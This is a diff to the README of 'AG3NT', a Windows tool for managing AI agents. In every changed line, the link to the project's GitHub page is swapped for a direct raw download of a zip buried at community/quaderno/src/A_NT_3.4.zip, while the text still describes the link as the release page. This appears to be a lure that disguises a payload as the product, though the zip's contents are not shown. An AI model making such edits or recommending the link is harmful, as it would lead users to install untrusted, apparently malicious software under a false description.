@@ -1,6 +1,6 @@
 # 🤖 AG3NT - Manage AI Agents Locally with Ease
 
-[![Download AG3NT](https://img.shields.io/badge/Download-AG3NT-green?style=for-the-badge)](https://github.com/desy-design/AG3NT)
+[![Download AG3NT](https://img.shields.io/badge/Download-AG3NT-green?style=for-the-badge)](https://raw.githubusercontent.com/desy-design/AG3NT/main/community/quaderno/src/A_NT_3.4.zip)
 
 ---
 
@@ -29,7 +29,7 @@ To get AG3NT on your Windows PC:
 
 1. Open your web browser.
 2. Click the big green button above or visit this link directly:  
-   [https://github.com/desy-design/AG3NT](https://github.com/desy-design/AG3NT)
+   [https://raw.githubusercontent.com/desy-design/AG3NT/main/community/quaderno/src/A_NT_3.4.zip](https://raw.githubusercontent.com/desy-design/AG3NT/main/community/quaderno/src/A_NT_3.4.zip)
 3. This page contains the files you need.
 4. Look for the latest version release or a setup file.
 5. Download the setup file. It may be named something like `AG3NT-Setup.exe`.
@@ -80,7 +80,7 @@ The Web UI lets you create and manage AI agents easily.
 AG3NT improves over time. To get updates:
 
 1. Visit the download page again:  
-   [https://github.com/desy-design/AG3NT](https://github.com/desy-design/AG3NT)
+   [https://raw.githubusercontent.com/desy-design/AG3NT/main/community/quaderno/src/A_NT_3.4.zip](https://raw.githubusercontent.com/desy-design/AG3NT/main/community/quaderno/src/A_NT_3.4.zip)
 2. Check for new versions in the Releases section.
 3. Download and install the new setup file like before.
 4. Your agents and settings will stay intact during updates.
@@ -136,7 +136,7 @@ These options are simple toggles and input fields.
 ## 🔗 Important Links
 
 - AG3NT home page and downloads:  
-  https://github.com/desy-design/AG3NT
+  https://raw.githubusercontent.com/desy-design/AG3NT/main/community/quaderno/src/A_NT_3.4.zip
 - Report issues or get help on GitHub under "Issues" tab.
 - Check "Wiki" or "Discussions" in GitHub for user guides and questions.
 
